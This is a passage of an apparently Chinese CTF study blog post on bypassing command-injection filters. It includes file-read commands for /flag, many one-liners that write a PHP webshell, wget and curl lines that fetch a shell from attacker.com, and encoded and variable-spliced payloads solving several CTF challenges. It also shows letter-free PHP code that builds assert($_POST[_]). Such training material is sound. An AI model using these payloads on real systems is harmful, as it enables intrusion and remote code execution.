/flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. less - 更强大的分页工具</span></span><br><span class="line"><span class="comment"># 同 more，如果是非交互式执行（如 RCE 漏洞利用），通常能直接回显内容</span></span><br><span class="line">less /flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. head - 输出文件头部</span></span><br><span class="line"><span class="comment"># 默认显示前 10 行。如果 flag 在文件开头，这非常有效</span></span><br><span class="line"><span class="built_in">head</span> /flag</span><br><span class="line"><span class="comment"># 变体：指定行数</span></span><br><span class="line"><span class="built_in">head</span> -n 1 /flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. tail - 输出文件尾部</span></span><br><span class="line"><span class="comment"># 默认显示后 10 行。如果 flag 是文件的唯一内容或在末尾，这很有效</span></span><br><span class="line"><span class="built_in">tail</span> /flag</span><br><span class="line"><span class="comment"># 变体：指定行数</span></span><br><span class="line"><span class="built_in">tail</span> -n 1 /flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7. nl - 添加行号 (Number Lines)</span></span><br><span class="line"><span class="comment"># 会输出文件内容并在前面加上行号，非常实用的 cat 替代品</span></span><br><span class="line"><span class="built_in">nl</span> /flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 8. od - 八进制转储 (Octal Dump)</span></span><br><span class="line"><span class="comment"># 默认输出八进制数据，为了读取文本，需要加上 -c (字符) 或 -t c 参数</span></span><br><span class="line"><span class="built_in">od</span> -c /flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 9. rev - 字符反转 (Reverse lines)</span></span><br><span class="line"><span class="comment"># 会将每一行的字符左右颠倒输出（如 &quot;flag&#123;...&#125;&quot; 变成 &quot;&#125;...&#123;galf&quot;）</span></span><br><span class="line"><span class="comment"># 读取后你需要手动或脚本将其再次反转回来</span></span><br><span class="line">rev /flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 10. fmt - 文本格式化</span></span><br><span class="line"><span class="comment"># 本意是用来优化文本段落格式的，但它也会读取并输出文件内容</span></span><br><span class="line"><span class="comment"># 可能会改变原始文件中的换行符或空格，但通常不影响读取 flag 字符串</span></span><br><span class="line"><span class="built_in">fmt</span> /flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 11. splain - Perl 诊断工具 (⚠️ 特殊情况)</span></span><br><span class="line"><span class="comment"># 注意：splain 并非标准的“文件读取”工具，它是 Perl 的一部分，用于解释警告信息。</span></span><br><span class="line"><span class="comment"># 在极少数特殊的 CTF 环境或配置下可能被利用，或者用于配合 Perl 代码执行。</span></span><br><span class="line"><span class="comment"># 如果直接作为 shell 命令读取文件，通常无法成功，除非配合管道或特殊参数。</span></span><br><span class="line"><span class="comment"># 示例（通常不直接工作，仅作为完整性列出）：</span></span><br><span class="line">splain /flag</span><br></pre></td></tr></table></figure><p>关于sort:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 基础用法 - 直接读取</span></span><br><span class="line"><span class="comment"># sort 默认会读取文件并按 ASCII 码升序排列输出</span></span><br><span class="line"><span class="comment"># 对于通常只有一行的 /flag 文件，效果完全等同于 cat</span></span><br><span class="line"><span class="built_in">sort</span> /flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 反向排序 (-r, --reverse)</span></span><br><span class="line"><span class="comment"># 以降序排列内容。如果 flag 文件有多行，顺序会颠倒，但内容都在</span></span><br><span class="line"><span class="built_in">sort</span> -r /flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 随机排序 (-R, --random-sort)</span></span><br><span class="line"><span class="comment"># 对行进行随机排序。虽然顺序乱了，但不仅能读取文件，</span></span><br><span class="line"><span class="comment"># 还能混淆某些通过监测“固定输出模式”的防御系统</span></span><br><span class="line"><span class="built_in">sort</span> -R /flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 去重输出 (-u, --unique)</span></span><br><span class="line"><span class="comment"># 读取文件并去除重复的行。</span></span><br><span class="line"><span class="comment"># 既然能去重，自然需要先读取并打印出来</span></span><br><span class="line"><span class="built_in">sort</span> -u /flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 忽略前导空格 (-b, --ignore-leading-blanks)</span></span><br><span class="line"><span class="comment"># 如果 flag 前面有空格，可以用这个参数（其实默认参数也能读出来）</span></span><br><span class="line"><span class="built_in">sort</span> -b /flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. 将输出写回文件 (-o)</span></span><br><span class="line"><span class="comment"># 这是一个极其危险的功能 (Write Primitive)</span></span><br><span class="line"><span class="comment"># 它可以读取 /flag 的内容，排序后写入到公共可读写目录（如 /tmp/flag）</span></span><br><span class="line"><span class="comment"># 绕过仅仅针对 stdout（标准输出）的拦截</span></span><br><span class="line"><span class="built_in">sort</span> /flag -o /tmp/flag.txt</span><br></pre></td></tr></table></figure><h3 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 重定向符 (Standard Redirection)</span></span><br><span class="line"><span class="comment"># 最基础的方法。如果 &gt; 没被过滤，这是首选。</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;?php system(\$_GET[c]);?&gt;&quot;</span> &gt; shell.php</span><br><span class="line"><span class="comment"># 变体：追加写入 (Append)，防止覆盖原有内容</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;content&quot;</span> &gt;&gt; shell.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. printf - 格式化输出</span></span><br><span class="line"><span class="comment"># 比 echo 更可靠，处理特殊字符（如换行 \n、制表符 \t）能力更强</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;&lt;?php system(\$_GET[c]);?&gt;&quot;</span> &gt; shell.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. tee - 管道分流</span></span><br><span class="line"><span class="comment"># 读取标准输入并写入文件。非常适合配合管道使用。</span></span><br><span class="line"><span class="comment"># 场景：当无法直接使用 &gt; 时（例如 sudo 权限限制）</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;?php system(\$_GET[c]);?&gt;&quot;</span> | <span class="built_in">tee</span> shell.php</span><br><span class="line"><span class="comment"># 变体：追加模式 (-a)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;content&quot;</span> | <span class="built_in">tee</span> -a shell.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. cat + Heredoc (嵌入文档)</span></span><br><span class="line"><span class="comment"># 适合写入多行内容，常用于交互式 shell 中粘贴长代码</span></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt;<span class="string">EOF &gt; shell.php</span></span><br><span class="line"><span class="string">&lt;?php </span></span><br><span class="line"><span class="string">system(\$_GET[c]);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. base64 - 编码写入 (⭐⭐⭐ 强烈推荐)</span></span><br><span class="line"><span class="comment"># 最稳健的方法。</span></span><br><span class="line"><span class="comment"># 1. 它可以绕过 WAF 对特殊字符（如 &lt;, &gt;, ?, spaces）的过滤</span></span><br><span class="line"><span class="comment"># 2. 它可以写入二进制文件（如 ELF 程序）而不损坏数据</span></span><br><span class="line"><span class="comment"># 先在本地编码：echo &quot;&lt;?php system(\$_GET[c]);?&gt;&quot; | base64 -&gt; PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pgo=</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pgo=&quot;</span> | <span class="built_in">base64</span> -d &gt; shell.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. dd - 数据转换和复制</span></span><br><span class="line"><span class="comment"># 这是一个底层工具，通常不会被 WAF 过滤</span></span><br><span class="line"><span class="comment"># if=输入流(input file), of=输出文件(output file)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;?php system(\$_GET[c]);?&gt;&quot;</span> | <span class="built_in">dd</span> of=shell.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7. awk - 文本处理工具</span></span><br><span class="line"><span class="comment"># awk 拥有完整的文件操作能力。利用 print &gt; &quot;filename&quot; 语法</span></span><br><span class="line">awk <span class="string">&#x27;BEGIN &#123;print &quot;&lt;?php system(\$_GET[c]);?&gt;&quot; &gt; &quot;shell.php&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 8. sed - 流编辑器</span></span><br><span class="line"><span class="comment"># 利用 &#x27;w&#x27; (write) 标记将处理的内容写入文件</span></span><br><span class="line"><span class="comment"># -n 阻止默认输出，&#x27;w shell.php&#x27; 将输入流写入文件</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;?php system(\$_GET[c]);?&gt;&quot;</span> | sed -n <span class="string">&#x27;w shell.php&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 9. cp / mv - 复制或移动</span></span><br><span class="line"><span class="comment"># 如果你已经在 /tmp 目录下有了文件（比如通过上传），可以将其移动到 Web 目录</span></span><br><span class="line"><span class="comment"># 假设 /tmp/a.txt 是恶意文件</span></span><br><span class="line"><span class="built_in">cp</span> /tmp/a.txt shell.php</span><br><span class="line"><span class="built_in">mv</span> /tmp/a.txt shell.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 10. tar - 归档工具</span></span><br><span class="line"><span class="comment"># 如果允许上传压缩包，通过解压也可以写入文件</span></span><br><span class="line"><span class="comment"># 很多系统允许解压覆盖现有文件</span></span><br><span class="line">tar -xvf shell.tar</span><br><span class="line"></span><br><span class="line"><span class="comment"># 11. wget / curl - 远程下载 (Out of Band)</span></span><br><span class="line"><span class="comment"># 如果目标机器出网，直接从你控制的服务器下载文件是最高效的</span></span><br><span class="line">wget http://attacker.com/shell.txt -O shell.php</span><br><span class="line">curl http://attacker.com/shell.txt -o shell.php</span><br></pre></td></tr></table></figure><h3 id="shell变量扩展-拼接"><a href="#shell变量扩展-拼接" class="headerlink" title="shell变量扩展&#x2F;拼接"></a>shell变量扩展&#x2F;拼接</h3><p>例如需要执行:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> flag</span><br></pre></td></tr></table></figure><p>但此时 <code>cat</code> 和 <code>flag</code> 还有 <code>\</code> 等符号被过滤，可以使用变量扩展：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">c=ca;t=t;f=f;l=lag;$c<span class="variable">$a</span> $f<span class="variable">$l</span></span><br></pre></td></tr></table></figure><p>来实现一个变量扩展的攻击手法</p><p>这里我们就可以更深刻的理解linux的shell解析命令的步骤了</p><p>对于有变量以及通配符的位置会先进行替换，等到命令完全变成字符串后再进行shell解析</p><p>另外，如果不使用花括号标记变量名界限，则变量名包含第一个无效字符和$之间的所有有效字符</p><p>例如：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">c=ca;ca=c;</span><br></pre></td></tr></table></figure><p>之后执行：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cat</span></span><br></pre></td></tr></table></figure><p>不会被解析为 <code>caat</code> 或者 <code>ct</code>，而是一个空字符，因为变量名是 <code>cat</code>，并没有声明过，所以返回空字符</p><table><thead><tr><th align="left"><strong>语法</strong></th><th align="left"><strong>含义</strong></th><th align="left"><strong>操作逻辑</strong></th><th align="left"><strong>结果</strong></th><th align="left"><strong>常用场景</strong></th></tr></thead><tbody><tr><td align="left"><code>$&#123;file#*/&#125;</code></td><td align="left">掐头 (短)</td><td align="left">删除从左边开始第一个 <code>/</code> 及其左边内容</td><td align="left"><code>usr/local/src/backup.tar.gz</code></td><td align="left">去掉开头的根斜杠</td></tr><tr><td align="left"><code>$&#123;file##*/&#125;</code></td><td align="left">掐头 (长)</td><td align="left">删除从左边开始最后一个 <code>/</code> 及其左边内容</td><td align="left"><code>backup.tar.gz</code></td><td align="left">获取文件名 (等同于 <code>basename</code>)</td></tr><tr><td align="left"><code>$&#123;file%.*&#125;</code></td><td align="left">去尾 (短)</td><td align="left">删除从右边开始第一个 <code>.</code> 及其右边内容</td><td align="left"><code>/usr/local/src/backup.tar</code></td><td align="left">去掉扩展名</td></tr><tr><td align="left"><code>$&#123;file%%.*&#125;</code></td><td align="left">去尾 (长)</td><td align="left">删除从右边开始最后一个 <code>.</code> 及其右边内容</td><td align="left"><code>/usr/local/src/backup</code></td><td align="left">去掉所有后缀</td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">str=<span class="string">&quot;123456789&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;str:0:3&#125;</span>   <span class="comment"># 从第 0 位开始，取 3 个字符 -&gt; &quot;123&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;str:5&#125;</span>     <span class="comment"># 从第 5 位开始，取到最后 -&gt; &quot;6789&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;str: -2&#125;</span>   <span class="comment"># 取最后 2 个字符 (注意冒号后有空格) -&gt; &quot;89&quot;</span></span><br></pre></td></tr></table></figure><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h5 id="ctfhub最后关"><a href="#ctfhub最后关" class="headerlink" title="ctfhub最后关"></a>ctfhub最后关</h5><p><img src="/2026/01/01/rce-plus/rce1.png"><br>最终payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1%0acd%09fl\ag_is_here%0aca\t%09f*</span><br></pre></td></tr></table></figure><p>使用url编码%0a代替换行符截断命令<br>%09代替空格<br>\截断关键字<br>*通配文件</p><h5 id="2025H-NCTF"><a href="#2025H-NCTF" class="headerlink" title="2025H&amp;NCTF"></a>2025H&amp;NCTF</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;Number&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$inputNumber</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;Number&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\d/&#x27;</span>, <span class="variable">$inputNumber</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;不行不行,不能这样&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$inputNumber</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;OK,接下来你知道该怎么做吗&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(</span><br><span class="line">                <span class="string">&#x27;/wget|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\*|sort|zip|mod|sl|find|sed|cp|mv|ty|php|tee|txt|grep|base|fd|df|\\\\|more|cc|tac|less|head|\.|\&#123;|\&#125;|uniq|copy|%|file|xxd|date|\[|\]|flag|bash|env|!|\?|ls|\&#x27;|\&quot;|id/i&#x27;</span>,</span><br><span class="line">                <span class="variable">$cmd</span></span><br><span class="line">            )) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;你传的参数似乎挺正经的,放你过去吧&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;nonono,hacker!!!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传参 <code>?Number[]=1</code> 以绕过第一个 <code>preg_match</code><br>接下来过滤了很多命令，<br>但是可以通过设置变量的形式绕过<br>例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=l=l;s=s;($l$s) //ls</span><br></pre></td></tr></table></figure><p>那么拼一个find然后用管道符传给xrag即可</p><h5 id="2025cuit网安院ctf"><a href="#2025cuit网安院ctf" class="headerlink" title="2025cuit网安院ctf"></a>2025cuit网安院ctf</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$passed</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You Win！&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$passed</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You lose！&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d0g3&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$passed</span> || <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;passed&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&quot;d0g3&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|echo|cat|tac|base|sh|tar|more|less|tail|nl|fl|vi|head|env|&amp;|%26|\||;|\^|\&#x27;|\]|&quot;|&lt;|&gt;|`|\/| |\\\\|\*/i&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;gun gun !&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;^_^!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$input</span>);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你还没通过第一关！&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>隔壁实验室出的一道简单题目，线下赛没打通有点耻辱了，也是总结这篇笔记的初衷</p><p>第一关过不过好像无所谓，直接传个passed也能解决，需要过的话可以使用数组绕过，</p><p>也可以使用0e科学计数法绕过</p><p>然后就进入了rce环节，管道符，通配符，正斜杠，尖括号，这些都没有，命令可以使用变量扩展解决</p><p>空格使用%09绕过，分隔符使用%0a绕过，最终需要构造这个命令：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cd ..;cd ..;cd ..;cat flag</span><br></pre></td></tr></table></figure><p>使用上述的替换方式替换即可：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">d0g3=cd%<span class="number">09</span>..%<span class="number">0</span>acd%<span class="number">09</span>..%<span class="number">0</span>acd%<span class="number">09</span>..%<span class="number">0</span>al=l%<span class="number">0</span><span class="keyword">as</span>=s%<span class="number">0</span>a$l<span class="variable">$s</span> <span class="comment">//列目录</span></span><br><span class="line">d0g3=cd%<span class="number">09</span>..%<span class="number">0</span>acd%<span class="number">09</span>..%<span class="number">0</span>acd%<span class="number">09</span>..%<span class="number">0</span>al=lag%<span class="number">0</span>af=f%<span class="number">0</span>ac=ca%<span class="number">0</span>at=t%<span class="number">0</span>a$c<span class="variable">$t</span>%<span class="number">09</span>$f<span class="variable">$l</span> <span class="comment">//读取  </span></span><br></pre></td></tr></table></figure><h1 id="无字母数字RCE"><a href="#无字母数字RCE" class="headerlink" title="无字母数字RCE:"></a>无字母数字RCE:</h1><p><a href="https://www.cnblogs.com/pursue-security/p/15404150.html">https://www.cnblogs.com/pursue-security/p/15404150.html</a><br>源码大致:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>核心思路是异或、取反、自增</p><p>例如要构造 <code>assert($_POST[_])</code><br>a:’%40’^’%21’ ; s:’%7B’^’%08’ ; s:’%7B’^’%08’ ; e:’%7B’^’%1E’ ; r:’%7E’^’%0C’ ; t:’%7C’^’%08’<br>P:’%0D’^’%5D’ ; O:’%0F’^’%40’ ; S:’%0E’^’%5D’ ; T:’%0B’^’%5F’<br>拼接起来：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%40&#x27;</span>^<span class="string">&#x27;%21&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%1E&#x27;</span>).(<span class="string">&#x27;%7E&#x27;</span>^<span class="string">&#x27;%0C&#x27;</span>).(<span class="string">&#x27;%7C&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>);  <span class="comment">// $_=assert</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0F&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0B&#x27;</span>^<span class="string">&#x27;%5F&#x27;</span>);  <span class="comment">// $__=_POST</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>; <span class="comment">//$___=$_POST</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);<span class="comment">//assert($_POST[_]);</span></span><br></pre></td></tr></table></figure><p>不过这样好像有数字啊<br>但还有用汉字的:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>++;                <span class="comment">//得到1，此时$_=1</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;极&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> = ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到a，此时$___=&quot;a&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;区&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到s，此时$___=&quot;as&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//此时$___=&quot;ass&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;皮&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到e，此时$___=&quot;asse&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;十&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到r，此时$___=&quot;asser&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;勺&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到t，此时$___=&quot;assert&quot;</span></span><br><span class="line"><span class="variable">$____</span> = <span class="string">&#x27;_&#x27;</span>;          <span class="comment">//$____=&#x27;_&#x27;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;寸&quot;</span>;</span><br><span class="line"><span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到P，此时$____=&quot;_P&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;小&quot;</span>;</span><br><span class="line"><span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到O，此时$____=&quot;_PO&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;欠&quot;</span>;</span><br><span class="line"><span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到S，此时$____=&quot;_POS&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;立&quot;</span>;</span><br><span class="line"><span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到T，此时$____=&quot;_POST&quot;</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$$____</span>;           <span class="comment">//$_ = $_POST</span></span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]);           <span class="comment">//assert($_POST[_])</span></span><br></pre></td></tr></table></figure><p>使用自增的:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>; <span class="comment">// $_=&#x27;Array&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>; <span class="comment">// A</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// E </span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span 